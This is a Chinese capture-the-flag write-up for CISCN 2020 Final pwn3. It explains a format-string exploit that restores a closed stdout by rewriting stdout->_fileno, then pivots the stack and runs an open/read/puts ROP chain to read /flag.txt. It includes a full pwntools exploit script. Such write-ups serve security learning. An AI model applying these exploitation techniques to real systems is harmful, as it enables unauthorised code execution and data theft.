> 原文链接: https://www.anquanke.com//post/id/219024 


# CISCN 2020 Final Day2 pwn3思路分享


                                阅读量   
                                **206629**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t016e85309899db6e0c.jpg)](https://p1.ssl.qhimg.com/t016e85309899db6e0c.jpg)



## 前言

亲眼见证隔壁队伍一个pwn3一血直通第二，我酸了。看起来大多数师傅的方法都是爆破1/4096，我的路子开始就有点偏，赛后花了4个小时还是写了一遍，分享一下我的思路。



## 总体思路
1. 由于`close(1)`将标准输出流关闭，使得fsb不能够再leak出任何地址；因此需要想办法将`stdout-&gt;_fileno = 2`，从而使得输出恢复正常；而由于整个binary的调用栈十分简单，使得fsb可利用的栈下方存在极少可利用的libc地址，而栈的上方则残留了stdout的地址，且经调试发现，这部分残留的内容不会被后续的函数调用所影响。
<li>同时关注到binary中存在一条这样的gadget:
<pre><code class="lang-x86asm">.text:0000000000000CDF                 mov     rax, [rbp+buf]
.text:0000000000000CE3                 mov     edx, 1          ; nbytes
.text:0000000000000CE8                 mov     rsi, rax        ; buf
.text:0000000000000CEB                 mov     edi, 0          ; fd
.text:0000000000000CF0                 call    read
</code></pre>
也就是说，只要结合栈上残留的`stdout`地址，将其低位改写从而创造出一个指向`stdout-&gt;_fileno的指针`，再将`[rbp+buf]`（也就是`[rbp-0x18]`）指向这个地址，r然后劫持控制流到这个地方，那么就能向`stdout-&gt;_fileno`写入数据了。
</li>
1. 但是改写成功之后，仍然需要保持程序的正常执行，所以后续涉及到一系列的控栈，调栈内存的操作，直到恢复正常。
<li>此后当作普通的fsb写即可，这里通过gadget控制`rdi`然后跳到`read_str`处执行：
<pre><code class="lang-x86asm">.text:0000000000000F21                 call    sub_CCD
</code></pre>
这里`rdi`就是写入的`buffer`的地址，`rsi`就是长度，那么这个时候写入orw的gadgets即可。
</li>


## 利用过程
<li>首先利用这条关键的`rbp`链实现栈上任意写，但是注意到`close(1)`之后，通过类似`%1000c`这样的payload来控制`%n`写入的值是不可行的，而读入的字符长度限制在288以内，所以一次只写1 byte，实际上也足够了，只是显得稍微繁琐：[![](https://n0nop.com/img/image-20200930105006732.png)](https://n0nop.com/img/image-20200930105006732.png)
</li>
<li>可以观察到根据给出的`gift`也即栈地址，上图中是`0x7ffdd5c43fa8`，其`-0x70`偏移处存在一个`stdout`地址：[![](https://n0nop.com/img/image-20200930105052603.png)](https://n0nop.com/img/image-20200930105052603.png)利用栈地址任意写把其低位改成0x90，就正好指向`stdout-&gt;_fileno`：
[![](https://n0nop.com/img/image-20200930105229429.png)](https://n0nop.com/img/image-20200930105229429.png)
</li>
<li>同时考虑到之后要将`rbp`改到这个`stdout-&gt;fileno`地址存放的栈地址`+0x18`的位置，使得`[rbp-0x18] = &amp;stdout-&gt;_fileno`，而当`read`完成之后需要返回时，会执行如下指令：
<pre><code class="lang-x86asm">.text:0000000000000D51                 leave
.text:0000000000000D52                 retn
</code></pre>
此时`rbp = 0x7ffdd5c43f50`，意味着会返回到`*0x0x7ffdd5c43f58 = 0x562e4bc84cf5`的位置，而实际上返回到这个地址正是`read`的返回地址，也就是说不会破坏程序的正常执行，只是需要多读入一个字节然后再次执行`leave; ret`的指令，只是此时`rbp`已经由于上一次的`leave`发生了变化；若要继续保持程序正常执行，那么就需要控制这个rbp为一个合理的值。
</li>
<li>而注意到上图中，`0x7ffdd5c43f48`出存放了一个data段的地址，因此可以通过爆破4 bits，将其写如一个gadget，控制`rsp + 0x38`：
<pre><code class="lang-x86asm">.text:0000000000001046                 add     rsp, 8
.text:000000000000104A                 pop     rbx
.text:000000000000104B                 pop     rbp
.text:000000000000104C                 pop     r12
.text:000000000000104E                 pop     r13
.text:0000000000001050                 pop     r14
.text:0000000000001052                 pop     r15
.text:0000000000001054                 retn
</code></pre>
而`rsp + 0x38`处正好是：
[![](https://n0nop.com/img/image-20200930110929111.png)](https://n0nop.com/img/image-20200930110929111.png)
<pre><code class="lang-x86asm">.text:0000000000000F3A                 nop
.text:0000000000000F3B                 pop     rbp
.text:0000000000000F3C                 retn
</code></pre>
但是此时若返回至`*0x7ffdd5c43f98 = 0x562e4bc84f3a`，依然会crash，而且目标地址和其相差2 bytes，无法通过一次fsb修改成功，因此这里通过写其低地址为改成`ret` 的gadget，转而通过控制`*0x7ffdd5c43fa0`来劫持控制流：
[![](https://n0nop.com/img/image-20200930112124918.png)](https://n0nop.com/img/image-20200930112124918.png)
</li>
<li>布置好之后，就可以跳到布置好的位置上，改写`stdout-&gt;_fileno = 2`了：[![](https://n0nop.com/img/image-20200930112338451.png)](https://n0nop.com/img/image-20200930112338451.png)同时保证程序的正常执行：
[![](https://n0nop.com/img/image-20200930112509720.png)](https://n0nop.com/img/image-20200930112509720.png)
就算再次执行`close(1)`也不会有影响。
</li>
<li>恢复完标准输出之后，就是普通的fsb做法，这里采用改写`printf`的返回地址为`pop rdi`的gadget，通过控制`rdi`指向返回地址处，然后控制执行流到：
<pre><code class="lang-x86asm">.text:0000000000000F21                 call    sub_CCD
</code></pre>
[![](https://n0nop.com/img/image-20200930113016680.png)](https://n0nop.com/img/image-20200930113016680.png)
[![](https://n0nop.com/img/image-20200930113105156.png)](https://n0nop.com/img/image-20200930113105156.png)
两个参数`rdi`为buffer地址，`rsi`为长度。
</li>
<li>之后就是写入orw的rop，劫持返回地址即可：[![](https://n0nop.com/img/image-20200930113330765.png)](https://n0nop.com/img/image-20200930113330765.png)[![](https://n0nop.com/img/image-20200930113408731.png)](https://n0nop.com/img/image-20200930113408731.png)
</li>


## exp

整体来说，由于存在爆破4 bit，同时要求给的stack地址低字节要大于0x70，所以理论上爆破的概率为`1/32`，但是exp很难写，相比于直接改`__libc_start_main`爆破到`stdout-&gt;_fileno`概率`1/4096`，这么写显得很不划算~~（但是对于我这种非酋来说，66.7%的中奖率我都能完美避过，那1/4096基本上在我这就是0了）~~。

```
from pwn import *
import sys, os, re

context(arch='amd64', os='linux', log_level='info')
context(terminal=['gnome-terminal', '--', 'zsh', '-c'])

_proc = os.path.abspath('./anti')
_libc = os.path.abspath('./libc.so.6')

libc = ELF(_libc)
elf = ELF(_proc)

p = process(argv=[_proc])

while True:
    try:
        p.settimeout(0.5)

        # get stack address
        prefix = "Ciscn20"
        p.recvuntil("Gift: 0x")
        stack_addr = int(p.recvline()[:-1], 16)

        # set stdout address low byte
        payload = "A" * ((stack_addr - 0x70) &amp; 0xFF) + "%6$hhn"
        p.sendlineafter("Come in quickly, I will close the door.", payload)
        payload = "A" * 0x90 + "%10$hhn"
        p.sendline(payload)

        # set gadget (add rsp, 0x38)
        payload = "A" * ((stack_addr - 0x60) &amp; 0xFF) + "%6$hhn"
        p.sendline(payload)
        # payload = "A" * (((_base(_proc) + 0x1046) &amp; 0xFF00) &gt;&gt; 8) + "%10$hhn" # bruteforce 4 bits
        payload = "A" * (((0x5000 + 0x1046) &amp; 0xFF00) &gt;&gt; 8) + "%10$hhn" # bruteforce 4 bits
        p.sendline(payload)

        # set stack address at stack (point to return address))
        payload = "A" * ((stack_addr + 0x28) &amp; 0xFF) + "%6$hhn"
        p.sendline(payload)
        payload = "A" * ((stack_addr - 0x10) &amp; 0xFF) + "%10$hhn"
        p.sendline(payload)
        payload = "A" * ((stack_addr + 0x29) &amp; 0xFF) + "%6$hhn"
        p.sendline(payload)
        payload = "A" * (((stack_addr - 0x10) &amp; 0xFF00) &gt;&gt; 8) + "%10$hhn"
        p.sendline(payload)

        # set fake old old rbp (for following stack pivot)
        payload = "A" * ((stack_addr - 0x58) &amp; 0xFF) + "%6$hhn"
        p.sendline(payload)
        payload = "A" * ((stack_addr + 0x8) &amp; 0xFF) + "%10$hhn"
        p.sendline(payload)
        payload = "A" * ((stack_addr - 0x57) &amp; 0xFF) + "%6$hhn"
        p.sendline(payload)
        payload = "A" * (((stack_addr + 0x8) &amp; 0xFF00) &gt;&gt; 8) + "%10$hhn"
        p.sendline(payload)

        # set return address to 
        '''
        .text:0000000000000CDF                 mov     rax, [rbp+buf]
        .text:0000000000000CE3                 mov     edx, 1          ; nbytes
        .text:0000000000000CE8                 mov     rsi, rax        ; buf
        .text:0000000000000CEB                 mov     edi, 0          ; fd
        .text:0000000000000CF0                 call    read
        '''
        payload = "A" * ((stack_addr - 0x8) &amp; 0xFF) + "%6$hhn"
        p.sendline(payload)
        # payload = "A" * ((('''_base(_proc)'''0x5000 + 0xCDF) &amp; 0xFF00) &gt;&gt; 8) + "%10$hhn"
        payload = "A" * ((0x5000 + 0xCDF) &amp; 0xFF) + "%10$hhn" # bruteforce 4 bits
        p.sendline(payload)
        payload = "A" * ((stack_addr - 0x7) &amp; 0xFF) + "%6$hhn"
        p.sendline(payload)
        # payload = "A" * (((_base(_proc) + 0xCDF) &amp; 0xFF00) &gt;&gt; 8) + "%10$hhn"
        payload = "A" * (((0x5000 + 0xCDF) &amp; 0xFF00) &gt;&gt; 8) + "%10$hhn"
        p.sendline(payload)

        # set return address (PIE + 0xF3D)
        payload = "A" * ((stack_addr + 0x10) &amp; 0xFF) + "%6$hhn" 
        p.sendline(payload)
        payload = "A" * 0x3D + "%10$hhn"
        p.sendline(payload)

        # set old rbp
        payload = "A" * ((stack_addr - 0x18) &amp; 0xFF) + "%6$hhn"
        p.sendline(payload)
        payload = "A" * ((stack_addr - 0x58) &amp; 0xFF) + "%10$hhn"
        p.sendline(payload)

        # set gadget ret
        # pause()
        payload = "A" * 0x3C + "%14$hhn"
        p.sendline(payload)

        # set stdout-&gt;_fileno = 2
        p.sendline("\x02")
        p.sendline("")
        p.recvuntil("Come in quickly, I will close the door.\n")

        # now the output has been recovered
        # leak PIE and libc
        p.sendline("%7$p%12$p")
        p.recvuntil("0x")
        PIE_base = int(p.recv(12), 16) - 0xf96
        p.recvuntil("0x")
        libc_base = int(p.recv(12), 16) - libc.sym['__libc_start_main'] - 240

        # leave a specific stack address at stack (for follwing fsb exploit)
        payload = "%" + str((stack_addr - 0x8) &amp; 0xFFFF) + "c%14$hn"
        p.sendline(payload)

        # set rop to control rdi and jump to:
        '''
        .text:0000000000000F21                 call    sub_CCD
        '''
        # this will help to read orw gadgets to stack 
        payload = "%" + str((PIE_base + 0x1053) &amp; 0xFFFF) + "c%10$hn"
        payload += "%" + str((stack_addr - 0x8 + (0x100 - ((PIE_base + 0x1053) &amp; 0xFF))) &amp; 0xFF) + "c%13$hhn"
        payload += "%" + str((0x21 + (0x100 - ((stack_addr - 0x8) &amp; 0xFF))) &amp; 0xFF) + "c%40$hhn"
        # pause()
        p.sendline(payload)

        pop_rdi = libc_base + 0x0000000000021112 # pop rdi ; ret
        pop_rsi = libc_base + 0x00000000000202f8 # pop rsi ; ret
        pop_rdx = libc_base + 0x0000000000001b92 # pop rdx ; ret

        # send orw gadgets 
        payload = flat([pop_rdi, stack_addr + 0x70, pop_rsi, 0, libc_base + libc.sym['open']])
        payload += flat([pop_rdi, 1, pop_rsi, stack_addr - 0x100, pop_rdx, 0x40, libc_base + libc.sym['read']])
        payload += flat([pop_rdi, stack_addr - 0x100, libc_base + libc.sym['puts']])
        payload += "/flag.txt"
        p.sendline(payload)

        break

    except:
        p.close()
        p = process(argv=[_proc])

success("libc_base: " + hex(libc_base))
success("stack_addr: " + hex(stack_addr))
success("PIE_base: " + hex(PIE_base))

p.interactive()
```
